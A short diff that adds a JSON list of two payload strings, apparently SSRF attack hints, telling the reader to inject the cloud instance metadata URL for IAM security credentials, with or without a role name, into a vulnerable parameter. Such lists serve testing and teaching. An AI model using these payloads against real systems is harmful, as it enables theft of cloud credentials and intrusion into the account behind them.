@@ -1,0 +1,4 @@
+[
+  "Inject URL in vulnerable parameter: http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+  "Or: http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME"
+]
